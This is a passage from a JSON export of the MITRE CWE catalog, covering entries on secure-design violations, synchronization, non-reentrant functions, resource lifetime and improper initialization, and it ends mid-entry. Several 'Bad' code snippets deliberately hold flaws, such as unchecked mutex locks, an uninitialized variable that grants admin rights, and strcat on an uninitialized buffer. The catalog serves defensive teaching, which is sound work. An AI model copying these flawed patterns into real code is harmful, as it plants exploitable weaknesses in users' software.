          "Publisher": "Information Sciences Institute",
          "URL": "https://www.ietf.org/rfc/rfc0793.txt",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      },
      "Notes": [
        {
          "Type": "Relationship",
          "Note": "Note that there is a close relationship between this weakness and CWE-603 (Use of Client-Side Authentication). If developers do not believe that a user can reverse engineer a client, then they are more likely to choose client-side authentication in the belief that it is safe."
        }
      ]
    },
    {
      "ID": "657",
      "Name": "Violation of Secure Design Principles",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product violates well-established principles for secure design.",
      "ExtendedDescription": "This can introduce resultant weaknesses or make it easier for developers to introduce related weaknesses during implementation. Because code is centered around design, it can be resource-intensive to fix design problems.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "710",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Other"
          ]
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-164",
          "Entries": [
            {
              "IntroText": "Switches may revert their functionality to that of hubs when the table used to map ARP information to the switch interface overflows, such as when under a spoofing attack. This results in traffic being broadcast to an eavesdropper, instead of being sent only on the relevant switch interface. To mitigate this type of problem, the developer could limit the number of ARP entries that can be recorded for a given switch interface, while other interfaces may keep functioning normally. Configuration options can be provided on the appropriate actions to be taken in case of a detected failure, but safe defaults should be used."
            }
          ]
        },
        {
          "ID": "DX-165",
          "Entries": [
            {
              "IntroText": "The IPSEC specification is complex, which resulted in bugs, partial implementations, and incompatibilities between vendors."
            }
          ]
        },
        {
          "ID": "DX-166",
          "Entries": [
            {
              "IntroText": "When executable library files are used on web servers, which is common in PHP applications, the developer might perform an access check in any user-facing executable, and omit the access check from the library file itself. By directly requesting the library file (CWE-425), an attacker can bypass this access check."
            }
          ]
        },
        {
          "ID": "DX-167",
          "Entries": [
            {
              "IntroText": "Single sign-on technology is intended to make it easier for users to access multiple resources or domains without having to authenticate each time. While this is highly convenient for the user and attempts to address problems with psychological acceptability, it also means that a compromise of a user's credentials can provide immediate access to all other resources or domains."
            }
          ]
        },
        {
          "ID": "DX-168",
          "Entries": [
            {
              "IntroText": "The design of TCP relies on the secrecy of Initial Sequence Numbers (ISNs), as originally covered in CVE-1999-0077 [REF-542]. If ISNs can be guessed (due to predictability, CWE-330) or sniffed (due to lack of encryption during transmission, CWE-312), then an attacker can hijack or spoof connections. Many TCP implementations have had variations of this problem over the years, including CVE-2004-0641, CVE-2002-1463, CVE-2001-0751, CVE-2001-0328, CVE-2001-0288, CVE-2001-0163, CVE-2001-0162, CVE-2000-0916, and CVE-2000-0328."
            },
            {
              "Reference": "REF-542"
            }
          ]
        },
        {
          "ID": "DX-169",
          "Entries": [
            {
              "IntroText": "The \"SweynTooth\" vulnerabilities in Bluetooth Low Energy (BLE) software development kits (SDK) were found to affect multiple Bluetooth System-on-Chip (SoC) manufacturers. These SoCs were used by many products such as medical devices, Smart Home devices, wearables, and other IoT devices. [REF-1314] [REF-1315]"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2019-6260",
          "Description": "Baseboard Management Controller (BMC) device implements Advanced High-performance Bus (AHB) bridges that do not require authentication for arbitrary read and write access to the BMC's physical address space from the host, and possibly the network [REF-1138].",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2019-6260"
        },
        {
          "Reference": "CVE-2007-5277",
          "Description": "The failure of connection attempts in a web browser resets DNS pin restrictions. An attacker can then bypass the same origin policy by rebinding a domain name to a different IP address. This was an attempt to \"fail functional.\"",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-5277"
        },
        {
          "Reference": "CVE-2006-7142",
          "Description": "Hard-coded cryptographic key stored in executable program.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-7142"
        },
        {
          "Reference": "CVE-2007-0408",
          "Description": "Server does not properly validate client certificates when reusing cached connections.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-0408"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-1",
          "EntryName": "Req SD-3"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-1",
          "EntryName": "Req SD-4"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-1",
          "EntryName": "Req SI-1"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-196",
          "Authors": [
            "Jerome H. Saltzer",
            "Michael D. Schroeder"
          ],
          "Title": "The Protection of Information in Computer Systems",
          "Publication": "Proceedings of the IEEE 63",
          "PublicationYear": "1975",
          "PublicationMonth": "09",
          "URL": "http://web.mit.edu/Saltzer/www/publications/protection/"
        },
        {
          "ExternalReferenceID": "REF-546",
          "Authors": [
            "Sean Barnum",
            "Michael Gegick"
          ],
          "Title": "Design Principles",
          "PublicationYear": "2005",
          "PublicationMonth": "09",
          "PublicationDay": "19",
          "URL": "https://web.archive.org/web/20220126060046/https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/design-principles",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-542",
          "Authors": [
            "Jon Postel, Editor"
          ],
          "Title": "RFC: 793, TRANSMISSION CONTROL PROTOCOL",
          "PublicationYear": "1981",
          "PublicationMonth": "09",
          "Publisher": "Information Sciences Institute",
          "URL": "https://www.ietf.org/rfc/rfc0793.txt",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-1138",
          "Authors": [
            "Stewart Smith"
          ],
          "Title": "CVE-2019-6260: Gaining control of BMC from the host processor",
          "PublicationYear": "2019",
          "URL": "https://www.flamingspork.com/blog/2019/01/23/cve-2019-6260:-gaining-control-of-bmc-from-the-host-processor/"
        },
        {
          "ExternalReferenceID": "REF-1314",
          "Authors": [
            "ICS-CERT"
          ],
          "Title": "ICS Alert (ICS-ALERT-20-063-01): SweynTooth Vulnerabilities",
          "PublicationYear": "2020",
          "PublicationMonth": "03",
          "PublicationDay": "04",
          "URL": "https://www.cisa.gov/news-events/ics-alerts/ics-alert-20-063-01",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-1315",
          "Authors": [
            "Matheus E. Garbelini, Sudipta Chattopadhyay, Chundong Wang, Singapore University of Technology and Design"
          ],
          "Title": "Unleashing Mayhem over Bluetooth Low Energy",
          "PublicationYear": "2020",
          "PublicationMonth": "03",
          "PublicationDay": "04",
          "URL": "https://asset-group.github.io/disclosures/sweyntooth/",
          "URLDate": "2023-01-25"
        }
      ],
      "MappingNotes": {
        "Usage": "Discouraged",
        "Rationale": "This CWE entry is a level-1 Class (i.e., a child of a Pillar). It might have lower-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "The Taxonomy_Mappings to ISA/IEC 62443 were added in CWE 4.10, but they are still under review and might change in future CWE versions. These draft mappings were performed by members of the \"Mapping CWE to 62443\" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG), and their work is incomplete as of CWE 4.10. The mappings are included to facilitate discussion and review by the broader ICS/OT community, and they are likely to change in future CWE versions."
        }
      ]
    },
    {
      "ID": "662",
      "Name": "Improper Synchronization",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product utilizes multiple threads or processes to allow temporary access to a shared resource that can only be exclusive to one process at a time, but it does not properly synchronize these actions, which might cause simultaneous accesses of this resource by multiple threads or processes.",
      "ExtendedDescription": "\n\nSynchronization refers to a variety of behaviors and mechanisms that allow two or more independently-operating processes or threads to ensure that they operate on shared resources in predictable ways that do not interfere with each other. Some shared resource operations cannot be executed atomically; that is, multiple steps must be guaranteed to execute sequentially, without any interference by other processes. Synchronization mechanisms vary widely, but they may include locking, mutexes, and semaphores. When a multi-step operation on a shared resource cannot be guaranteed to execute independent of interference, then the resulting behavior can be unpredictable. Improper synchronization could lead to data or memory corruption, denial of service, etc.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "664",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "691",
          "ViewID": "1000"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "362",
          "ViewID": "1000"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Confidentiality",
            "Other"
          ],
          "Impact": [
            "Modify Application Data",
            "Read Application Data",
            "Alter Execution Logic"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Use industry standard APIs to synchronize your code."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-24",
          "Entries": [
            {
              "IntroText": "The following function attempts to acquire a lock in order to perform operations on a shared resource."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tvoid f(pthread_mutex_t *mutex) {\n\t\t\tpthread_mutex_lock(mutex);\n```\n/* access shared resource */* \n\t\t\t\n\t\t\t\n\t\t\tpthread_mutex_unlock(mutex);}"
            },
            {
              "BodyText": "However, the code does not check the value returned by pthread_mutex_lock() for errors. If pthread_mutex_lock() cannot acquire the mutex for any reason, the function may introduce a race condition into the program and result in undefined behavior."
            },
            {
              "BodyText": "In order to avoid data races, correctly written programs must check the result of thread synchronization functions and appropriately handle all errors, either by attempting to recover from them or reporting them to higher levels."
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "```\n\tint f(pthread_mutex_t *mutex) {\n\t\t\tint result;\n\t\t\tresult = pthread_mutex_lock(mutex);\n\t\t\tif (0 != result)\n\t\t\t\treturn result;\n```\n/* access shared resource */* \n\t\t\t\n\t\t\t\n\t\t\treturn pthread_mutex_unlock(mutex);}"
            }
          ]
        },
        {
          "ID": "DX-170",
          "Entries": [
            {
              "IntroText": "The following code intends to fork a process, then have both the parent and child processes print a single line."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tstatic void print (char * string) {\n\t\t\tchar * word;\n\t\t\tint counter;\n\t\t\tfor (word = string; counter = *word++; ) {\n\t\t\t\t\tputc(counter, stdout);\n\t\t\t\t\tfflush(stdout);\n```\n/* Make timing window a little larger... */* \n\t\t\t\t\t\n\t\t\t\t\tsleep(1);}}\n\t\n\tint main(void) {\n\t```\n\t\t\tpid_t pid;\n\t\t\tpid = fork();\n\t\t\tif (pid == -1) {\n\t\t\t\texit(-2);\n\t\t\t}\n\t\t\telse if (pid == 0) {\n\t\t\t\tprint(\"child\\n\");\n\t\t\t}\n\t\t\telse {\n\t\t\t\tprint(\"PARENT\\n\");\n\t\t\t}\n\t\t\texit(0);\n\t}\n```"
            },
            {
              "BodyText": "One might expect the code to print out something like:"
            },
            {
              "BodyText": "```\n\t\tPARENT\n\t\tchild\n```"
            },
            {
              "BodyText": "However, because the parent and child are executing concurrently, and stdout is flushed each time a character is printed, the output might be mixed together, such as:"
            },
            {
              "BodyText": "```\n\t\tPcAhRiElNdT\n\t\t[blank line]\n\t\t[blank line]\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2021-1782",
          "Description": "Chain: improper locking (CWE-667) leads to race condition (CWE-362), as exploited in the wild per CISA KEV.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2021-1782"
        },
        {
          "Reference": "CVE-2009-0935",
          "Description": "Attacker provides invalid address to a memory-reading function, causing a mutex to be unlocked twice",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0935"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "SIG00-C",
          "EntryName": "Mask signals handled by noninterruptible signal handlers"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "SIG31-C",
          "EntryName": "Do not access shared objects in signal handlers",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "CLASP",
          "EntryName": "State synchronization error"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "VNA03-J",
          "EntryName": "Do not assume that a group of calls to independently atomic methods is atomic"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP19",
          "EntryName": "Missing Lock"
        }
      ],
      "RelatedAttackPatterns": [
        "25",
        "26",
        "27",
        "29"
      ],
      "MappingNotes": {
        "Usage": "Discouraged",
        "Rationale": "This CWE entry is a level-1 Class (i.e., a child of a Pillar). It might have lower-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "Deeper research is necessary for synchronization and related mechanisms, including locks, mutexes, semaphores, and other mechanisms. Multiple entries are dependent on this research, which includes relationships to concurrency, race conditions, reentrant functions, etc. CWE-662 and its children - including CWE-667, CWE-820, CWE-821, and others - may need to be modified significantly, along with their relationships."
        }
      ]
    },
    {
      "ID": "663",
      "Name": "Use of a Non-reentrant Function in a Concurrent Context",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product calls a non-reentrant function in a concurrent context in which a competing code sequence (e.g. thread or signal handler) may have an opportunity to call the same function or otherwise influence its state.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "662",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Confidentiality",
            "Other"
          ],
          "Impact": [
            "Modify Memory",
            "Read Memory",
            "Modify Application Data",
            "Read Application Data",
            "Alter Execution Logic"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Use reentrant functions if available."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Add synchronization to your non-reentrant function."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "In Java, use the ReentrantLock Class."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-171",
          "Entries": [
            {
              "IntroText": "In this example, a signal handler uses syslog() to log a message:"
            },
            {
              "Nature": "Bad",
              "ExampleCode": "```\n\tchar *message;\n\tvoid sh(int dummy) {\n\t\tsyslog(LOG_NOTICE,\"%s\\n\",message);\n\t\tsleep(10);\n\t\texit(0);\n\t}\n\tint main(int argc,char* argv[]) {\n\t\t...\n\t\tsignal(SIGHUP,sh);\n\t\tsignal(SIGTERM,sh);\n\t\tsleep(10);\n\t\texit(0);\n\t}\n\t\tIf the execution of the first call to the signal handler is suspended after invoking syslog(), and the signal handler is called a second time, the memory allocated by syslog() enters an undefined, and possibly, exploitable state.\n```"
            }
          ]
        },
        {
          "ID": "DX-172",
          "Entries": [
            {
              "IntroText": "The following code relies on getlogin() to determine whether or not a user is trusted. It is easily subverted."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tpwd = getpwnam(getlogin());\n\tif (isTrustedGroup(pwd->pw_gid)) {\n\t\tallow();\n\t} else {\n\t\tdeny();\n\t}\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2001-1349",
          "Description": "unsafe calls to library functions from signal handler",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2001-1349"
        },
        {
          "Reference": "CVE-2004-2259",
          "Description": "SIGCHLD signal to FTP server can cause crash under heavy load while executing non-reentrant functions like malloc/free.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2004-2259"
        }
      ],
      "RelatedAttackPatterns": [
        "29"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-547",
          "Section": "Class ReentrantLock",
          "Authors": [
            "SUN"
          ],
          "Title": "Java Concurrency API",
          "URL": "https://docs.oracle.com/javase/1.5.0/docs/api/java/util/concurrent/locks/ReentrantLock.html",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-548",
          "Authors": [
            "Dipak Jha, Software Engineer, IBM"
          ],
          "Title": "Use reentrant functions for safer signal handling",
          "URL": "https://archive.ph/rl1XR",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "664",
      "Name": "Improper Control of a Resource Through its Lifetime",
      "Abstraction": "Pillar",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product does not maintain or incorrectly maintains control over a resource throughout its lifetime of creation, use, and release.",
      "ExtendedDescription": "\n\nResources often have explicit instructions on how to be created, used and destroyed. When code does not follow these instructions, it can lead to unexpected behaviors and potentially exploitable states.\n\n\nEven without explicit instructions, various principles are expected to be adhered to, such as \"Do not use an object until after its creation is complete,\" or \"do not use an object after it has been slated for destruction.\"\n",
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Not Technology-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Other"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Use Static analysis tools to check for unreleased resources."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2018-1000613",
          "Description": "Cryptography API uses unsafe reflection when deserializing a private key",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2018-1000613"
        },
        {
          "Reference": "CVE-2022-21668",
          "Description": "Chain: Python library does not limit the resources used to process images that specify a very large number of bands (CWE-1284), leading to excessive memory consumption (CWE-789) or an integer overflow (CWE-190).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-21668"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "FIO39-C",
          "EntryName": "Do not alternately input and output from a stream without an intervening flush or positioning call",
          "MappingFit": "CWE More Abstract"
        }
      ],
      "RelatedAttackPatterns": [
        "196",
        "21",
        "60",
        "61",
        "62"
      ],
      "MappingNotes": {
        "Usage": "Discouraged",
        "Rationale": "This CWE entry is high-level when lower-level children are available.",
        "Comments": "Consider children or descendants of this entry instead.",
        "Reasons": [
          "Abstraction"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "More work is needed on this entry and its children. There are perspective/layering issues; for example, one breakdown is based on lifecycle phase (CWE-404, CWE-665), while other children are independent of lifecycle, such as CWE-400. Others do not specify as many bases or variants, such as CWE-704, which primarily covers numbers at this stage."
        }
      ]
    },
    {
      "ID": "665",
      "Name": "Improper Initialization",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product does not initialize or incorrectly initializes a resource, which might leave the resource in an unexpected state when it is accessed or used.",
      "ExtendedDescription": "This can have security implications when the associated resource is expected to have certain properties or values, such as a variable that determines whether a user has been authenticated or not.",
      "LikelihoodOfExploit": "Medium",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "664",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        },
        {
          "Ordinality": "Resultant"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "This weakness can occur in code paths that are not well-tested, such as rare error conditions. This is because the use of uninitialized data would be noticed as a bug during frequently-used functionality."
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Memory",
            "Read Application Data"
          ],
          "Note": "When reusing a resource such as memory or a program variable, the original contents of that resource may not be cleared before it is sent to an untrusted party."
        },
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism"
          ],
          "Note": "If security-critical decisions rely on a variable having a \"0\" or equivalent value, and the programming language performs this initialization on behalf of the programmer, then a bypass of security may occur."
        },
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Crash, Exit, or Restart"
          ],
          "Note": "The uninitialized data may contain values that cause program flow to change in ways that the programmer did not intend. For example, if an uninitialized variable is used as an array index in C, then its previous contents may produce an index that is outside the range of the array, possibly causing a crash or an exit in other environments."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-2",
          "Method": "Automated Dynamic Analysis",
          "Description": "\n\nThis weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.\n\n\nInitialization problems may be detected with a stress-test by calling the software simultaneously from a large number of threads or processes, and look for evidence of any unexpected behavior. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.\n",
          "Effectiveness": "Moderate"
        },
        {
          "DetectionMethodID": "DM-12",
          "Method": "Manual Dynamic Analysis",
          "Description": "Identify error conditions that are not likely to occur during normal usage and trigger them. For example, run the program under low memory conditions, run with insufficient privileges or permissions, interrupt a transaction before it is completed, or disable connectivity to basic network services such as DNS. Monitor the software for any unexpected behavior. If you trigger an unhandled exception or similar error that was discovered and handled by the application's environment, it may still indicate unexpected conditions that were not handled by the application itself."
        },
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "MitigationID": "MIT-3",
          "Phase": [
            "Requirements"
          ],
          "Strategy": "Language Selection",
          "Description": "\n\nUse a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.\n\n\nFor example, in Java, if the programmer does not explicitly initialize a variable, then the code could produce a compile-time error (if the variable is local) or automatically initialize the variable to the default value for the variable's type. In Perl, if explicit initialization is not performed, then a default value of undef is assigned, which is interpreted as 0, false, or an equivalent value depending on the context in which the variable is accessed.\n"
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Identify all variables and data stores that receive information from external sources, and apply input validation to make sure that they are only initialized to expected values."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Explicitly initialize all your variables and other data stores, either during declaration or just before the first usage."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Pay close attention to complex conditionals that affect initialization, since some conditions might not perform the initialization."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Avoid race conditions (CWE-362) during initialization routines."
        },
        {
          "Phase": [
            "Build and Compilation"
          ],
          "Description": "Run or compile your product with settings that generate warnings about uninitialized variables or data."
        },
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-105",
          "Entries": [
            {
              "IntroText": "Here, a boolean initiailized field is consulted to ensure that initialization tasks are only completed once. However, the field is mistakenly set to true during static initialization, so the initialization code is never reached."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tprivate boolean initialized = true;\n\tpublic void someMethod() {\n\t\t\tif (!initialized) {\n```\n// perform initialization tasks* \n\t\t\t\t\t...\n\t\t\t\t\t\n\t\t\t\t\tinitialized = true;}"
            }
          ]
        },
        {
          "ID": "DX-54",
          "Entries": [
            {
              "IntroText": "The following code intends to limit certain operations to the administrator only."
            },
            {
              "Nature": "Bad",
              "Language": "Perl",
              "ExampleCode": "```\n\t$username = GetCurrentUser();\n\t$state = GetStateData($username);\n\tif (defined($state)) {\n\t\t$uid = ExtractUserID($state);\n\t}\n```\n# do stuff* \n\tif ($uid == 0) {\n\t```\n\t\tDoAdminThings();\n\t}\n```"
            },
            {
              "BodyText": "If the application is unable to extract the state information - say, due to a database timeout - then the $uid variable will not be explicitly set by the programmer. This will cause $uid to be regarded as equivalent to \"0\" in the conditional, allowing the original user to perform administrator actions. Even if the attacker cannot directly influence the state data, unexpected errors could cause incorrect privileges to be assigned to a user just by accident."
            }
          ]
        },
        {
          "ID": "DX-106",
          "Entries": [
            {
              "IntroText": "The following code intends to concatenate a string to a variable and print the string."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tchar str[20];\n\tstrcat(str, \"hello world\");\n\tprintf(\"%s\", str);\n```"
            },
            {
              "BodyText": "This might seem innocent enough, but str was not initialized, so it contains random memory. As a result, str[0] might not contain the null terminator, so the copy might start at an offset other than 0. The consequences can vary, depending on the underlying memory."
            },
            {
              "BodyText": "If a null terminator is found before str[8], then some bytes of random garbage will be printed before the \"hello world\" string. The memory might contain sensitive information from previous uses, such as a password (which might occur as a result of CWE-14 or CWE-244). In this example, it might not be a big deal, but consider what could happen if large amounts of memory are printed out before the null terminator is found."
            },
            {
              "BodyText": "If a null terminator isn't found before str[8], then a buffer overflow could occur, since strcat will first look for the null terminator, then copy 12 bytes starting with that location. Alternately, a buffer over-read might occur (CWE-126) if a null terminator isn't found before the end of the memory segment is reached, leading to a segmentation fault and crash."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2001-1471",
          "Description": "chain: an invalid value prevents a library file from being included, skipping initialization of key variables, leading to resultant eval injection.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2001-1471"
        },
        {
          "Reference": "CVE-2008-3637",
          "Description": "Improper error checking in protection mechanism produces an uninitialized variable, allowing security bypass and code execution.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-3637"
        },
        {
          "Reference": "CVE-2008-4197",
          "Description": "Use of uninitialized memory may allow code execution.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-4197"
        },
        {
          "Reference": "CVE-2008-2934",
          "Description": "Free of an uninitialized pointer leads to crash and possible code execution.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-2934"
        },
        {
          "Reference": "CVE-2007-3749",
          "Description": "OS kernel does not reset a port when starting a setuid program, allowing local users to access the port and gain privileges.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-3749"
        },
        {
          "Reference": "CVE-2008-0063",
          "Description": "Product does not clear memory contents when generating an error message, leading to information leak.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-0063"
        },
        {
          "Reference": "CVE-2008-0062",
          "Description": "Lack of initialization triggers NULL pointer dereference or double-free.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-0062"
        },
        {
          "Reference": "CVE-2008-0081",
          "Description": "Uninitialized variable leads to code execution in popular desktop application.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-0081"
        },
        {
          "Reference": "CVE-2008-3688",
          "Description": "chain: Uninitialized variable leads to infinite loop.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-3688"
        },
        {
          "Reference": "CVE-2008-3475",
          "Description": "chain: Improper initialization leads to memory corruption.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-3475"
        },
        {
          "Reference": "CVE-2008-5021",
          "Description": "Composite: race condition allows attacker to modify an object while it is still being initialized, causing software to access uninitialized memory.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-5021"
        },
        {
          "Reference": "CVE-2005-1036",
          "Description": "Chain: Bypass of access restrictions due to improper authorization (CWE-862) of a user results from an improperly initialized (CWE-909) I/O permission bitmap",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1036"
        },
        {
          "Reference": "CVE-2008-3597",
          "Description": "chain: game server can access player data structures before initialization has happened leading to NULL dereference",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-3597"
        },
        {
          "Reference": "CVE-2009-2692",
          "Description": "chain: uninitialized function pointers can be dereferenced allowing code execution",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2692"
        },
        {
          "Reference": "CVE-2009-0949",
          "Description": "chain: improper initialization of memory can lead to NULL dereference",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0949"
        },
        {
          "Reference": "CVE-2009-3620",
          "Description": "chain: some unprivileged ioctls do not verify that a structure has been initialized before invocation, leading to NULL dereference",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-3620"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "PLOVER",
          "EntryName": "Incorrect initialization"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "ARR02-C",
          "EntryName": "Explicitly specify array bounds, even if implicitly defined by an initializer"
